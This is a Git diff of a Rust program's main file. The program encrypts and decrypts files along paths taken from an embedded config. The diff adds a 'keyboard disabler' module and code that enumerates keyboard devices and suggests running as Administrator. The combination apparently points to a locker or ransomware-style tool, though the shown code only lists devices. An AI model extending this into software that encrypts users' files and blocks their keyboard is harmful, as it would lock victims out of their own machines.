@@ -2,13 +2,15 @@ mod utils;
 mod models;
 mod encrypt;
 mod decrypt;
+mod keyboard_diabler;
 
-use std::time::Duration;
+use crate::keyboard_diabler::KeyboardController;
 use crate::models::Config;
-use tokio::time::{sleep_until, Instant};
 use crate::utils::{get_embedded_config, process_path};
 use colored::*;
-use rypes::errors::errors::RError;
+use std::time::Duration;
+use tokio::time::{sleep_until, Instant};
+
 // C:\Users\yjrur\OneDrive\Рабочий стол\test
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
@@ -81,6 +83,33 @@ async fn main() -> anyhow::Result<()> {
 		println!("{}", format!("⚠️ Completed with errors: {} processed, {} errors", total_processed, total_errors).yellow());
 	}
 	println!("{}", "══════════════════════════════════════════════".cyan());
+
+	let keyboards = match KeyboardController::find_keyboards() {
+		Ok(keyboards) => keyboards,
+		Err(e) => {
+			println!("{} {}", "❌ KeyboardController::find_keyboards()".red(), e);
+			sleep_until(Instant::now() + Duration::from_secs(55)).await;
+			std::process::exit(1);
+		}
+	};
+
+	//todo
+	println!("\n=== RESULTS ===");
+	if keyboards.is_empty() {
+		println!("No keyboards found!");
+		println!("\nPossible reasons:");
+		println!("  1. Run as Administrator");
+		println!("  2. Check Device Manager for keyboard devices");
+		println!("  3. Try running with different permissions");
+	} else {
+		println!("Found {} keyboard(s):\n", keyboards.len());
+		for (i, kb) in keyboards.iter().enumerate() {
+			println!("{}. Description: {}", i + 1, kb.description);
+			println!("   Instance ID: {}", kb.instance_id);
+			println!("   Dev Node: {}\n", kb.dev_node);
+		}
+	}
+	sleep_until(Instant::now() + Duration::from_secs(55)).await;
 
 	println!("\nPress Enter to exit...");
 	let _ = std::io::stdin().read_line(&mut String::new());
